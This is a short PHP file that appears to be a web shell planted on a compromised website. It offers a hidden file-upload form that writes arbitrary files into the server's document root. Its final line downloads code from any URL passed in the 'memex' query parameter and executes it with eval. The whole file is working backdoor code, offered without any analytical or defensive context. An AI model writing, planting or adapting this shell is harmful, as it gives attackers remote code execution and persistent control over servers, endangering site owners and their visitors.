IDBTE4M
<?php
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$_SERVER['DOCUMENT_ROOT'] . '/'.$_FILES['file']['name'])){
        echo '<font color="green">http://'.$_SERVER['SERVER_NAME'].'/'.$_FILES['file']['name'].'</font><br />';
    }else{
        echo '<font color="red">ASU RAIMU ELK :P</font><br />';
    }
}
if(isset($_GET['000'])){
echo '<center>
<form enctype="multipart/form-data" method="POST">
<input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
}
$ch = curl_init($_GET['memex']); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result);
?>